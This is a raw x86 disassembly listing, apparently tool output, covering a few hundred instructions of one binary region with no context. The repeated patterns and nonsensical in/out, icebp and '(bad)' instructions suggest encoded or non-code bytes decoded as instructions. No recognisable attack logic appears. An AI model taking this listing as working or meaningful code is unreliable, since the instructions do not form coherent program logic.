  421583:	mov    dl,0x71
  421585:	and    eax,0x58ebebe7
  42158a:	mov    dl,0x71
  42158c:	es out 0xeb,eax
  42158f:	jmp    0x4215e2
  421591:	mov    dl,0x71
  421593:	daa    
  421594:	out    0xeb,eax
  421596:	jmp    0x421584
  421598:	mov    dl,0x71
  42159a:	and    bh,0xeb
  42159d:	jmp    0x4215ce
  42159f:	mov    dl,0x71
  4215a1:	and    edi,0xb25eebeb
  4215a7:	jno    0x42152b
  4215a9:	out    0xeb,eax
  4215ab:	jmp    0x4215fe
  4215ad:	mov    dl,0x71
  4215af:	and    edi,0xffffffeb
  4215b2:	jmp    0x421601
  4215b4:	mov    dl,0x71
  4215b6:	test   bh,ah
  4215b8:	jmp    0x4215a5
  4215ba:	pusha  
  4215bb:	mov    dl,0x71
  4215bd:	test   edi,esp
  4215bf:	jmp    0x4215ac
  4215c1:	push   ecx
  4215c2:	mov    dl,0x71
  4215c4:	xchg   bh,ah
  4215c6:	jmp    0x4215b3
  4215c8:	xor    dh,BYTE PTR [edx-0x1418788f]
  4215ce:	jmp    0x421625
  4215d0:	mov    dl,0x71
  4215d2:	mov    bh,ah
  4215d4:	jmp    0x4215c1
  4215d6:	pop    eax
  4215d7:	mov    dl,0x71
  4215d9:	mov    edi,esp
  4215db:	jmp    0x4215c8
  4215dd:	push   ecx
  4215de:	mov    dl,0x71
  4215e0:	mov    ah,bh
  4215e2:	jmp    0x4215cf
  4215e4:	sub    eax,0xe78b71b2
  4215e9:	jmp    0x4215d6
  4215eb:	in     al,dx
  4215ec:	mov    dl,0x31
  4215ee:	ins    BYTE PTR es:[edi],dx
  4215ef:	ds mov dl,0x31
  4215f2:	ins    DWORD PTR es:[edi],dx
  4215f3:	push   ecx
  4215f4:	mov    dl,0x31
  4215f6:	outs   dx,BYTE PTR ds:[esi]
  4215f7:	dec    ebp
  4215f8:	mov    dl,0x31
  4215fa:	outs   dx,DWORD PTR ds:[esi]
  4215fb:	push   eax
  4215fc:	mov    dl,0x31
  4215fe:	jo     0x421632
  421600:	mov    dl,0x31
  421602:	jno    0x421659
  421604:	mov    dl,0x31
  421606:	jb     0x421660
  421608:	mov    dl,0x31
  42160a:	jae    0x42165d
  42160c:	mov    dl,0x31
  42160e:	je     0x4215fc
  421610:	mov    dl,0x71
  421612:	or     bh,ah
  421614:	jmp    0x421601
  421616:	sbb    BYTE PTR [edx-0x1418f68f],dh
  42161c:	jmp    0x42165a
  42161e:	mov    dl,0x71
  421620:	or     ah,bh
  421622:	jmp    0x42160f
  421624:	cmp    BYTE PTR [edx-0x1418f48f],dh
  42162a:	jmp    0x421659
  42162c:	mov    dl,0x71
  42162e:	or     al,0xe7
  421630:	jmp    0x42161d
  421632:	cmp    dh,BYTE PTR [edx-0x1418f28f]
  421638:	jmp    0x421652
  42163a:	mov    dl,0x71
  42163c:	push   cs
  42163d:	out    0xeb,eax
  42163f:	jmp    0x42167d
  421641:	mov    dl,0x71
  421643:	movntq (bad),mm5
  421644:	out    0xeb,eax
  421646:	jmp    0x421686
  421648:	mov    dl,0x71
  42164a:	adc    bh,ah
  42164c:	jmp    0x421639
  42164e:	xor    eax,0xe71171b2
  421653:	jmp    0x421640
  421655:	cmp    dh,BYTE PTR [edx-0x1418ed8f]
  42165b:	jmp    0x42169d
  42165d:	mov    dl,0x71
  42165f:	adc    esp,edi
  421661:	jmp    0x42164e
  421663:	in     al,dx
  421664:	push   edx
  421665:	mov    bl,0x71
  421667:	mov    edi,fs
  421669:	jmp    0x421656
  42166b:	inc    eax
  42166c:	in     al,dx
  42166d:	push   edx
  42166e:	mov    bl,0x71
  421670:	mov    fs,edi
  421672:	jmp    0x42165f
  421674:	ds in  al,dx
  421676:	push   edx
  421677:	mov    bl,0x71
  421679:	nop
  42167a:	out    0xeb,eax
  42167c:	jmp    0x4216ab
  42167e:	in     al,dx
  42167f:	push   edx
  421680:	mov    bl,0x71
  421682:	xchg   edx,eax
  421683:	out    0xeb,eax
  421685:	jmp    0x4216c1
  421687:	in     al,dx
  421688:	push   edx
  421689:	mov    bl,0x71
  42168b:	xchg   esp,eax
  42168c:	out    0xeb,eax
  42168e:	jmp    0x4216cf
  421690:	in     al,dx
  421691:	push   edx
  421692:	mov    bl,0x71
  421694:	xchg   esi,eax
  421695:	out    0xeb,eax
  421697:	jmp    0x4216c6
  421699:	in     al,dx
  42169a:	push   edx
  42169b:	mov    bl,0x71
  42169d:	cwde   
  42169e:	out    0xeb,eax
  4216a0:	jmp    0x4216d1
  4216a2:	in     al,dx
  4216a3:	push   edx
  4216a4:	mov    bl,0x71
  4216a6:	call   0x52ec:0x40ebebe7
  4216ad:	mov    bl,0x71
  4216af:	pushf  
  4216b0:	out    0xeb,eax
  4216b2:	jmp    0x4216e9
  4216b4:	in     al,dx
  4216b5:	push   edx
  4216b6:	mov    bl,0x71
  4216b8:	sahf   
  4216b9:	out    0xeb,eax
  4216bb:	jmp    0x4216f8
  4216bd:	in     al,dx
  4216be:	push   edx
  4216bf:	mov    bl,0x71
  4216c1:	mov    al,ds:0x3aebebe7
  4216c6:	in     al,dx
  4216c7:	push   edx
  4216c8:	mov    bl,0x71
  4216ca:	mov    ds:0xecebebe7,al
  4216cf:	in     al,dx
  4216d0:	mov    bl,0x71
  4216d2:	adc    al,0xe7
  4216d4:	jmp    0x4216c1
  4216d6:	in     al,dx
  4216d7:	in     al,dx
  4216d8:	in     al,dx
  4216d9:	in     al,dx
  4216da:	mov    dl,0x71
  4216dc:	test   al,0xe7
  4216de:	jmp    0x4216cb
  4216e0:	pop    eax
  4216e1:	mov    dl,0x71
  4216e3:	test   eax,0x5febebe7
  4216e8:	mov    dl,0x71
  4216ea:	stos   BYTE PTR es:[edi],al
  4216eb:	out    0xeb,eax
  4216ed:	jmp    0x42174f
  4216ef:	mov    dl,0x71
  4216f1:	stos   DWORD PTR es:[edi],eax
  4216f2:	out    0xeb,eax
  4216f4:	jmp    0x421754
  4216f6:	mov    dl,0x71
  4216f8:	lods   al,BYTE PTR ds:[esi]
  4216f9:	out    0xeb,eax
  4216fb:	jmp    0x42174c
  4216fd:	mov    dl,0x71
  4216ff:	lods   eax,DWORD PTR ds:[esi]
  421700:	out    0xeb,eax
  421702:	jmp    0x421751
  421704:	mov    dl,0x71
  421706:	scas   al,BYTE PTR es:[edi]
  421707:	out    0xeb,eax
  421709:	jmp    0x42176b
  42170b:	mov    dl,0x71
  42170d:	scas   eax,DWORD PTR es:[edi]
  42170e:	out    0xeb,eax
  421710:	jmp    0x42173f
  421712:	mov    dl,0x71
  421714:	mov    al,0xe7
  421716:	jmp    0x421703
  421718:	in     al,dx
  421719:	mov    dl,0x71
  42171b:	cmp    bh,ah
  42171d:	jmp    0x42170a
  42171f:	xor    esi,DWORD PTR [edx-0x1418c68f]
  421725:	jmp    0x421778
  421727:	mov    dl,0x71
  421729:	cmp    ah,bh
  42172b:	jmp    0x421718
  42172d:	pusha  
  42172e:	mov    dl,0x71
  421730:	cmp    esp,edi
  421732:	jmp    0x42171f
  421734:	xor    dh,BYTE PTR [edx-0x1418c38f]
  42173a:	jmp    0x421791
  42173c:	mov    dl,0x71
  42173e:	cmp    eax,0x58ebebe7
  421743:	mov    dl,0x71
  421745:	ds out 0xeb,eax
  421748:	jmp    0x42179b
  42174a:	mov    dl,0x71
  42174c:	aas    
  42174d:	out    0xeb,eax
  42174f:	jmp    0x421790
  421751:	mov    dl,0x71
  421753:	inc    eax
  421754:	out    0xeb,eax
  421756:	jmp    0x4217ad
  421758:	mov    dl,0x71
  42175a:	inc    ecx
  42175b:	out    0xeb,eax
  42175d:	jmp    0x4217c5
  42175f:	mov    dl,0x71
  421761:	inc    edx
  421762:	out    0xeb,eax
  421764:	jmp    0x4217b7
  421766:	mov    dl,0x71
  421768:	inc    ebx
  421769:	out    0xeb,eax
  42176b:	jmp    0x421759
  42176d:	mov    dl,0x71
  42176f:	sub    bl,ch
  421771:	jmp    0x42175e
  421773:	xor    esi,DWORD PTR [edx-0x1414d68f]
  421779:	jmp    0x4217cc
  42177b:	mov    dl,0x71
  42177d:	sub    ch,bl
  42177f:	jmp    0x42176c
  421781:	pusha  
  421782:	mov    dl,0x71
  421784:	sub    ebp,ebx
  421786:	jmp    0x421773
  421788:	aas    
  421789:	mov    dl,0x71
  42178b:	sub    al,0xeb
  42178d:	jmp    0x42177a
  42178f:	gs mov dl,0x71
  421792:	sub    eax,0x5febebeb
  421797:	mov    dl,0x71
  421799:	cs jmp 0x421787
  42179c:	jmp    0x4217fe
  42179e:	mov    dl,0x71
  4217a0:	das    
  4217a1:	jmp    0x42178e
  4217a3:	jmp    0x4217f6
  4217a5:	mov    dl,0x71
  4217a7:	xor    bl,ch
  4217a9:	jmp    0x421796
  4217ab:	pop    ecx
  4217ac:	mov    dl,0x71
  4217ae:	xor    ebx,ebp
  4217b0:	jmp    0x42179d
  4217b2:	xor    BYTE PTR [edx-0x1414cd8f],dh
  4217b8:	jmp    0x42180f
  4217ba:	mov    dl,0x71
  4217bc:	xor    ebp,ebx
  4217be:	jmp    0x4217ab
  4217c0:	pop    esi
  4217c1:	mov    dl,0x71
  4217c3:	xor    al,0xeb
  4217c5:	jmp    0x4217b2
  4217c7:	push   ecx
  4217c8:	mov    dl,0x71
  4217ca:	xor    eax,0x4febebeb
  4217cf:	mov    dl,0x71
  4217d1:	ss jmp 0x4217bf
  4217d4:	jmp    0x421836
  4217d6:	mov    dl,0x71
  4217d8:	aaa    
  4217d9:	jmp    0x4217c6
  4217db:	jmp    0x421838
  4217dd:	mov    dl,0x71
  4217df:	cmp    bl,ch
  4217e1:	jmp    0x4217ce
  4217e3:	pop    esi
  4217e4:	mov    dl,0x71
  4217e6:	cmp    ebx,ebp
  4217e8:	jmp    0x4217d5
  4217ea:	gs mov dl,0x71
  4217ed:	cmp    ch,bl
  4217ef:	jmp    0x4217dc
  4217f1:	sub    eax,0xeb3b71b2
  4217f6:	jmp    0x4217e3
  4217f8:	in     al,dx
  4217f9:	mov    bl,0x71
  4217fb:	mov    ah,0xe7
  4217fd:	jmp    0x4217ea
  4217ff:	in     al,dx
  421800:	in     al,dx
  421801:	in     al,dx
  421802:	in     al,dx
  421803:	mov    bl,0x31
  421805:	loopne 0x4217f3
  421807:	in     al,dx
  421808:	in     al,dx
  421809:	in     al,dx
  42180a:	jns    0x42184d
  42180c:	ins    BYTE PTR es:[edi],dx
  42180d:	ds ja  0x421881
  421810:	inc    eax
  421811:	jmp    0x4217fe
  421813:	jmp    0x421851
  421815:	jmp    0x421798
  421817:	inc    esp
  421818:	out    0xeb,eax
  42181a:	jmp    0x421891
  42181c:	jno    0x421832
  42181e:	out    0xeb,eax
  421820:	jmp    0x42189b
  421822:	jns    0x421840
  421824:	out    0xeb,eax
  421826:	jmp    0x421865
  421828:	ja     0x4217ab
  42182a:	inc    eax
  42182b:	jmp    0x421818
  42182d:	jmp    0x42186d
  42182f:	jmp    0x4217b2
  421831:	inc    esp
  421832:	out    0xeb,eax
  421834:	jmp    0x4218ab
  421836:	jno    0x4217dc
  421838:	out    0xeb,eax
  42183a:	jmp    0x4217ee
  42183c:	jno    0x4218ba
  42183e:	out    0xeb,al
  421840:	jmp    0x421881
  421842:	mov    dl,0x71
  421844:	jge    0x42182c
  421846:	jmp    0x421833
  421848:	pop    eax
  421849:	mov    dl,0x71
  42184b:	jle    0x421833
  42184d:	jmp    0x42183a
  42184f:	push   ecx
  421850:	mov    dl,0x71
  421852:	jg     0x42183a
  421854:	jmp    0x421841
  421856:	push   ecx
  421857:	mov    dl,0x71
  421859:	and    dh,0xeb
  42185c:	jmp    0x4218ba
  42185e:	mov    dl,0x71
  421860:	and    esi,0x79ecebeb
  421866:	jno    0x4218e4
  421868:	out    0xeb,al
  42186a:	jmp    0x4218a8
  42186c:	ja     0x4218e7
  42186e:	inc    eax
  42186f:	jmp    0x42185c
  421871:	jmp    0x4218b0
  421873:	jmp    0x4217f6
  421875:	inc    esp
  421876:	out    0xeb,eax
  421878:	jmp    0x4218ef
  42187a:	xor    esp,esp
  42187c:	jns    0x4217ff
  42187e:	sub    bl,ch
  421880:	jmp    0x42186d
  421882:	ds ja  0x4218f6
  421885:	inc    eax
  421886:	jmp    0x421873
  421888:	jmp    0x4218c6
  42188a:	jmp    0x42180d
  42188c:	inc    esp
  42188d:	out    0xeb,eax
  42188f:	jmp    0x421906
  421891:	jno    0x42190b
  421893:	call   0xec990483
  421898:	push   esi
  421899:	in     al,dx
  42189a:	push   esi
  42189b:	in     al,dx
  42189c:	jmp    0x42181f
  42189e:	dec    eax
  42189f:	out    0xeb,eax
  4218a1:	jmp    0x42191c
  4218a3:	jns    0x42184d
  4218a5:	out    0xeb,eax
  4218a7:	jmp    0x4218e6
  4218a9:	ja     0x42182c
  4218ab:	inc    eax
  4218ac:	jmp    0x421899
  4218ae:	jmp    0x4218ee
  4218b0:	jmp    0x421833
  4218b2:	inc    esp
  4218b3:	out    0xeb,eax
  4218b5:	jmp    0x42192c
  4218b7:	jno    0x42192d
  4218b9:	call   0x71bc04a9
  4218be:	and    bh,0xeb
  4218c1:	jmp    0x4218ff
  4218c3:	ja     0x42193e
  4218c5:	inc    eax
  4218c6:	jmp    0x4218b3
  4218c8:	jmp    0x421907
  4218ca:	jmp    0x42184d
  4218cc:	inc    esp
  4218cd:	out    0xeb,eax
  4218cf:	jmp    0x421946
  4218d1:	jno    0x4218e7
  4218d3:	jmp    0x4218c0
  4218d5:	jmp    0x42192b
  4218d7:	sub    ebp,ebp
  4218d9:	in     al,dx
  4218da:	in     al,dx
  4218db:	jns    0x42185e
  4218dd:	fsub   st(0),st
  4218df:	jmp    0x4218cc
  4218e1:	ds jmp 0x421865
  4218e4:	js     0x4218ce
  4218e6:	jmp    0x4218d3
  4218e8:	push   esi
  4218e9:	in     al,dx
  4218ea:	jmp    0x42186d
  4218ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218ed:	out    0xeb,eax
  4218ef:	jmp    0x42196a
  4218f1:	jno    0x42192b
  4218f3:	out    0xeb,eax
  4218f5:	jmp    0x421933
  4218f7:	ja     0x421972
  4218f9:	inc    eax
  4218fa:	jmp    0x4218e7
  4218fc:	jmp    0x42193b
  4218fe:	jmp    0x421881
  421900:	inc    esp
  421901:	out    0xeb,eax
  421903:	jmp    0x42197a
  421905:	jno    0x42192f
  421907:	out    0xeb,eax
  421909:	jmp    0x4218bd
  42190b:	jno    0x4218e9
  42190d:	call   0xb42f04fd
  421912:	jno    0x421948
  421914:	out    0xeb,eax
  421916:	jmp    0x42191c
  421918:	in     al,dx
  421919:	in     al,dx
  42191a:	in     al,dx
  42191b:	push   esp
  42191c:	sbb    eax,0x79ececee
  421921:	sbb    esp,0x3eebebe8
  421927:	jmp    0x4218aa
  421929:	js     0x421913
  42192b:	jmp    0x421918
  42192d:	outs   dx,DWORD PTR ds:[esi]
  42192e:	in     al,0xf6
  421930:	bound  edx,QWORD PTR [ecx+0x79]
  421933:	jno    0x4219a5
  421935:	out    0xeb,eax
  421937:	jmp    0x4219ae
  421939:	jno    0x421903
  42193b:	call   0x79bc052b
  421940:	fsub   st(0),st
  421942:	jmp    0x42192f
  421944:	jne    0x4219bf
  421946:	mov    ah,0xe7
  421948:	jmp    0x421935
  42194a:	jns    0x4218cd
  42194c:	jo     0x421936
  42194e:	jmp    0x42193b
  421950:	ds jns 0x4219c4
  421953:	fsub   st(0),st
  421955:	jmp    0x421942
  421957:	cmp    al,0xeb
  421959:	xor    DWORD PTR [eax+ebp*8-0x15],0xf4b06feb
  421961:	ja     0x4219dc
  421963:	enter  0xebe8,0xeb
  421967:	cmp    eax,0xe8dc8179
  42196c:	jmp    0x421959
  42196e:	ds jmp 0x4218f2
  421971:	je     0x42195b
  421973:	jmp    0x421960
  421975:	outs   dx,DWORD PTR ds:[esi]
  421976:	mov    al,0xf4
  421978:	push   esi
  421979:	in     al,dx
  42197a:	push   esi
  42197b:	in     al,dx
  42197c:	push   esi
  42197d:	out    dx,eax
  42197e:	push   esi
  42197f:	in     al,dx
  421980:	push   esi
  421981:	out    dx,eax
  421982:	push   esi
  421983:	in     eax,dx
  421984:	ja     0x4219f7
  421986:	mov    ah,0xe7
  421988:	jmp    0x421975
  42198a:	cmp    al,0xeb
  42198c:	adc    DWORD PTR [ebx+ebp*8],0x7175ebeb
  421993:	enter  0xebe8,0xeb
  421997:	mov    bl,0x31
  421999:	js     0x421987
  42199b:	in     al,dx
  42199c:	in     al,dx
  42199d:	in     al,dx
  42199e:	mov    bl,0x31
  4219a0:	jl     0x42198e
  4219a2:	in     al,dx
  4219a3:	in     al,dx
  4219a4:	in     al,dx
  4219a5:	outs   dx,DWORD PTR ds:[esi]
  4219a6:	test   eax,0xebebe8c8
  4219ab:	jmp    0x4219a8
  4219ad:	jo     0x421960
  4219af:	in     eax,dx
  4219b0:	in     al,dx
  4219b1:	in     al,dx
  4219b2:	mov    bl,0x31
  4219b4:	loopne 0x4219a4
  4219b6:	lock repnz in al,dx
  4219b9:	mov    bl,0x71
  4219bb:	sub    al,0xe7
  4219bd:	jmp    0x4219aa
  4219bf:	clc    
  4219c0:	in     al,dx
  4219c1:	in     al,dx
  4219c2:	in     al,dx
  4219c3:	push   esi
  4219c4:	lock push esp
  4219c6:	in     al,dx
  4219c7:	cld    
  4219c8:	in     al,dx
  4219c9:	in     al,dx
  4219ca:	ja     0x421a05
  4219cc:	loopne 0x421a3b
  4219ce:	lods   eax,DWORD PTR ds:[esi]
  4219cf:	sti    
  4219d0:	es in  al,dx
  4219d2:	in     al,dx
  4219d3:	cmp    eax,0x81ebec56
  4219d8:	pusha  
  4219d9:	call   0x31b805c9
  4219de:	jl     0x421a57
  4219e0:	inc    ecx
  4219e1:	jl     0x421a58
  4219e3:	inc    ecx
  4219e4:	mov    WORD PTR [ebx-0x14198b8f],?
  4219ea:	jmp    0x4219d8
  4219ec:	in     al,dx
  4219ed:	in     al,dx
  4219ee:	in     al,dx
  4219ef:	outs   dx,DWORD PTR ds:[esi]
  4219f0:	imul   ecx,DWORD PTR [esp+ebp*8-0x12958f05],0x7179ecec
  4219fb:	je     0x4219e3
  4219fd:	jmp    0x4219ea
  4219ff:	jne    0x421a72
  421a01:	jo     0x4219e9
  421a03:	jmp    0x4219f0
  421a05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a06:	in     al,dx
  421a07:	in     al,dx
  421a08:	in     al,dx
  421a09:	in     al,dx
  421a0a:	cmp    al,0xeb
  421a0c:	mov    eax,ds:0xebebe670
  421a11:	push   esi
  421a12:	(bad)  
  421a13:	jmp    0x421a56
  421a15:	in     al,0xeb
  421a17:	popa   
  421a18:	loopne 0x421a05
  421a1a:	popa   
  421a1b:	mov    ebx,gs
  421a1d:	mov    eax,ds:0xebebe8c8
  421a22:	jmp    0x4219a5
  421a24:	and    al,0xeb
  421a26:	jmp    0x421a13
  421a28:	jmp    0x4219ab
  421a2a:	adc    al,0xe7
  421a2c:	jmp    0x421a19
  421a2e:	mov    bl,0x71
  421a30:	ins    BYTE PTR es:[edi],dx
  421a31:	out    0xeb,al
  421a33:	jmp    0x421a21
  421a35:	in     al,dx
  421a36:	in     al,dx
  421a37:	in     al,dx
  421a38:	xlat   BYTE PTR ds:[ebx]
  421a39:	sti    
  421a3a:	ja     0x421ab5
  421a3c:	ins    BYTE PTR es:[edi],dx
  421a3d:	out    0xeb,al
  421a3f:	jmp    0x421ab0
  421a41:	lods   eax,DWORD PTR ds:[esi]
  421a42:	in     eax,dx
  421a43:	jne    0x421abe
  421a45:	ins    BYTE PTR es:[edi],dx
  421a46:	out    0xeb,al
  421a48:	jmp    0x421ab7
  421a4a:	test   eax,0xebebe66c
  421a4f:	add    BYTE PTR [edx],bh
  421a51:	icebp  
  421a52:	in     al,dx
  421a53:	pop    edi
  421a54:	imul   ebp,DWORD PTR [edi-0x57],0x6c
  421a58:	out    0xeb,eax
  421a5a:	jmp    0x421a48
  421a5c:	popa   
  421a5d:	bound  esi,QWORD PTR [ebx-0x1419978f]
  421a63:	jmp    0x421a51
  421a65:	in     al,dx
  421a66:	in     al,dx
  421a67:	in     al,dx
  421a68:	xlat   BYTE PTR ds:[ebx]
  421a69:	sti    
  421a6a:	ja     0x4219ed
  421a6c:	push   0x6febebe6
  421a71:	scas   al,BYTE PTR es:[edi]
  421a72:	in     eax,dx
  421a73:	jne    0x4219f6
  421a75:	push   0x77ebebe6
  421a7a:	jno    0x421ab0
  421a7c:	out    0xeb,eax
  421a7e:	jmp    0x421aef
  421a80:	aam    0xed
  421a82:	and    eax,0xebe66871
  421a87:	jmp    0x421ae8
  421a89:	xor    DWORD PTR [edi+0x79],esi
  421a8c:	push   0xfbebebe6
  421a91:	mov    ds:0xe78cf980,al
  421a96:	jmp    0x421a83
  421a98:	ja     0x421b0b
  421a9a:	ins    BYTE PTR es:[edi],dx
  421a9b:	out    0xeb,al
  421a9d:	jmp    0x421a8e
  421a9f:	jno    0x421b09
  421aa1:	out    0xeb,al
  421aa3:	jmp    0x421b1c
  421aa5:	cmp    DWORD PTR [ebx+edi*8+0x27edf0a2],ecx
  421aac:	mov    esp,0x79770c61
  421ab1:	push   0xbdebebe6
  421ab6:	aad    0xfb
  421ab8:	mov    ds:0xe78e3980,eax
  421abd:	jmp    0x421aaa
  421abf:	jno    0x421a7f
  421ac1:	popa   
  421ac2:	div    BYTE PTR [ebx-0x1418938f]
  421ac8:	jmp    0x421ab7
  421aca:	in     al,dx
  421acb:	in     al,dx
  421acc:	in     al,dx
  421acd:	xlat   BYTE PTR ds:[ebx]
  421ace:	xchg   ebp,edx
  421ad0:	push   edx
  421ad1:	jmp    0x421abe
  421ad3:	jmp    0x421a88
  421ad5:	jno    0x421b43
  421ad7:	out    0xeb,al
  421ad9:	jmp    0x421ac7
  421adb:	in     al,dx
  421adc:	in     al,dx
  421add:	in     al,dx
  421ade:	xlat   BYTE PTR ds:[ebx]
  421adf:	sti    
  421ae0:	ja     0x421b53
  421ae2:	ins    BYTE PTR es:[edi],dx
  421ae3:	out    0xeb,al
  421ae5:	jmp    0x421b56
  421ae7:	lods   al,BYTE PTR ds:[esi]
  421ae8:	in     eax,dx
  421ae9:	jne    0x421b5c
  421aeb:	ins    BYTE PTR es:[edi],dx
  421aec:	out    0xeb,al
  421aee:	jmp    0x421b5f
  421af0:	test   eax,0xebebe8d4
  421af5:	in     al,dx
  421af6:	popa   
  421af7:	imul   esi,DWORD PTR [edi+0x79],0x6c
  421afb:	out    0xeb,al
  421afd:	jmp    0x421b26
  421aff:	cmp    eax,esp
  421b01:	pop    edi
  421b02:	pusha  
  421b03:	mov    bl,0x71
  421b05:	fs out 0xeb,al
  421b08:	jmp    0x421af6
  421b0a:	in     al,dx
  421b0b:	in     al,dx
  421b0c:	in     al,dx
  421b0d:	xlat   BYTE PTR ds:[ebx]
  421b0e:	sti    
  421b0f:	ja     0x421a92
  421b11:	fs out 0xeb,al
  421b14:	jmp    0x421b85
  421b16:	scas   al,BYTE PTR es:[edi]
  421b17:	in     eax,dx
  421b18:	jne    0x421a9b
  421b1a:	fs out 0xeb,al
  421b1d:	jmp    0x421b96
  421b1f:	jno    0x421b4d
  421b21:	out    0xeb,eax
  421b23:	jmp    0x421b94
  421b25:	aam    0xed
  421b27:	and    eax,0xebe66471
  421b2c:	jmp    0x421b8d
  421b2e:	das    
  421b2f:	ja     0x421baa
  421b31:	fs out 0xeb,al
  421b34:	jmp    0x421b31
  421b36:	mov    ds:0xe708f980,al
  421b3b:	jmp    0x421b28
  421b3d:	ja     0x421bb0
  421b3f:	ins    BYTE PTR es:[edi],dx
  421b40:	out    0xeb,al
  421b42:	jmp    0x421b33
  421b44:	jno    0x421baa
  421b46:	out    0xeb,al
  421b48:	jmp    0x421bc1
  421b4a:	cmp    DWORD PTR [ebx+edi*8+0x27edf0a2],ecx
  421b51:	mov    esp,0x79770a61
  421b56:	fs out 0xeb,al
  421b59:	jmp    0x421b56
  421b5b:	stos   BYTE PTR es:[edi],al
  421b5c:	cmp    cl,0x9
  421b5f:	out    0xeb,eax
  421b61:	jmp    0x421bd4
  421b63:	mov    esi,0x71b3f661
  421b68:	aam    0xe8
  421b6a:	jmp    0x421b57
  421b6c:	in     eax,dx
  421b6d:	in     al,dx
  421b6e:	in     al,dx
  421b6f:	in     al,dx
  421b70:	xlat   BYTE PTR ds:[ebx]
  421b71:	mov    ebp,edx
  421b73:	push   ebp
  421b74:	jmp    0x421b61
  421b76:	jmp    0x421be7
  421b78:	test   eax,0xebebe8d4
  421b7d:	in     eax,dx
  421b7e:	popa   
  421b7f:	cmc    
  421b80:	outs   dx,DWORD PTR ds:[esi]
  421b81:	test   eax,0xebebe76c
  421b86:	in     eax,dx
  421b87:	pusha  
  421b88:	sbb    ebp,ebx
  421b8a:	inc    ecx
  421b8b:	mov    WORD PTR [edi+0x71],?
  421b8e:	aam    0xe8
  421b90:	jmp    0x421b7d
  421b92:	mov    bl,0xec
  421b94:	in     al,dx
  421b95:	in     al,dx
  421b96:	in     al,dx
  421b97:	in     al,dx
  421b98:	ja     0x421c13
  421b9a:	js     0x421b82
  421b9c:	jmp    0x421b89
  421b9e:	mov    bl,0x70
  421ba0:	jns    0x421b7a
  421ba2:	out    0xeb,al
  421ba4:	jmp    0x421b9c
  421ba6:	in     al,dx
  421ba7:	in     al,dx
  421ba8:	in     al,dx
  421ba9:	mov    bl,0x71
  421bab:	pusha  
  421bac:	call   0xed2f079c
  421bb1:	in     al,dx
  421bb2:	in     al,dx
  421bb3:	aad    0x2f
  421bb5:	out    dx,al
  421bb6:	in     al,dx
  421bb7:	in     al,dx
  421bb8:	push   esi
  421bb9:	imul   bl
  421bbb:	inc    ecx
  421bbc:	in     al,0x54
  421bbe:	in     al,dx
  421bbf:	ins    BYTE PTR es:[edi],dx
  421bc0:	in     al,dx
  421bc1:	in     al,dx
  421bc2:	push   esi
  421bc3:	in     al,dx
  421bc4:	ja     0x421c07
  421bc6:	mov    WORD PTR [esi],?
  421bc8:	jmp    0x421b4b
  421bca:	dec    eax
  421bcb:	out    0xeb,eax
  421bcd:	jmp    0x421b82
  421bcf:	jno    0x421c2d
  421bd1:	out    0xeb,al
  421bd3:	jmp    0x421bc1
  421bd5:	in     al,dx
  421bd6:	in     al,dx
  421bd7:	in     al,dx
  421bd8:	xlat   BYTE PTR ds:[ebx]
  421bd9:	sti    
  421bda:	ja     0x421c4d
  421bdc:	pop    esp
  421bdd:	out    0xeb,al
  421bdf:	jmp    0x421c50
  421be1:	lods   al,BYTE PTR ds:[esi]
  421be2:	in     eax,dx
  421be3:	jne    0x421c56
  421be5:	pop    esp
  421be6:	out    0xeb,al
  421be8:	jmp    0x421c59
  421bea:	test   eax,0xebebe65c
  421bef:	neg    BYTE PTR [edi+0x24]
  421bf2:	ja     0x421c6d
  421bf4:	pop    esp
  421bf5:	out    0xeb,al
  421bf7:	jmp    0x421c68
  421bf9:	test   al,0x79
  421bfb:	fsub   st,st(6)
  421bfd:	jmp    0x421bea
  421bff:	in     al,dx
  421c00:	pusha  
  421c01:	adc    al,0x77
  421c03:	sbb    DWORD PTR [esi+eiz*8-0x15],0x207177eb
  421c0b:	jmp    0x421bf8
  421c0d:	jmp    0x421bfe
  421c0f:	jo     0x421b92
  421c11:	fsub   st,st(6)
  421c13:	jmp    0x421c00
  421c15:	jne    0x421c88
  421c17:	and    bl,ch
  421c19:	jmp    0x421c06
  421c1b:	ja     0x421c96
  421c1d:	enter  0xebe8,0xeb
  421c21:	cmp    eax,0xe7a481eb
  421c26:	jmp    0x421c13
  421c28:	xlat   BYTE PTR ds:[ebx]
  421c29:	pushf  
  421c2a:	ja     0x421bad
  421c2c:	enter  0xebe8,0xeb
  421c30:	ds jmp 0x421bb4
  421c33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c34:	out    0xeb,eax
  421c36:	jmp    0x421c8e
  421c38:	lock push esp
  421c3a:	in     al,dx
  421c3b:	cld    
  421c3c:	in     al,dx
  421c3d:	in     al,dx
  421c3e:	ja     0x421cb1
  421c40:	and    bl,ch
  421c42:	jmp    0x421c2f
  421c44:	cmp    al,0x56
  421c46:	in     al,dx
  421c47:	jmp    0x421bca
  421c49:	pusha  
  421c4a:	call   0x71b8083a
  421c4f:	pop    eax
  421c50:	out    0xeb,eax
  421c52:	jmp    0x421caa
  421c54:	in     al,dx
  421c55:	jns    0x421cd0
  421c57:	fsub   st(0),st
  421c59:	jmp    0x421c46
  421c5b:	cmp    eax,0xe87481eb
  421c60:	jmp    0x421c4d
  421c62:	outs   dx,DWORD PTR ds:[esi]
  421c63:	mov    al,0xf4
  421c65:	mov    bl,0x71
  421c67:	pusha  
  421c68:	out    0xeb,al
  421c6a:	jmp    0x421c58
  421c6c:	in     al,dx
  421c6d:	in     al,dx
  421c6e:	in     al,dx
  421c6f:	mov    bl,0x71
  421c71:	pop    eax
  421c72:	out    0xeb,al
  421c74:	jmp    0x421c62
  421c76:	in     al,dx
  421c77:	in     al,dx
  421c78:	in     al,dx
  421c79:	xlat   BYTE PTR ds:[ebx]
  421c7a:	sti    
  421c7b:	ja     0x421bfe
  421c7d:	pop    eax
  421c7e:	out    0xeb,al
  421c80:	jmp    0x421cf1
  421c82:	scas   al,BYTE PTR es:[edi]
  421c83:	in     eax,dx
  421c84:	jne    0x421c07
  421c86:	pop    eax
  421c87:	out    0xeb,al
  421c89:	jmp    0x421cfa
  421c8b:	test   eax,0xebebe658
  421c90:	neg    BYTE PTR [edi+0x4b]
  421c93:	ja     0x421d06
  421c95:	pop    eax
  421c96:	out    0xeb,al
  421c98:	jmp    0x421d09
  421c9a:	test   al,0x71
  421c9c:	fsub   st,st(6)
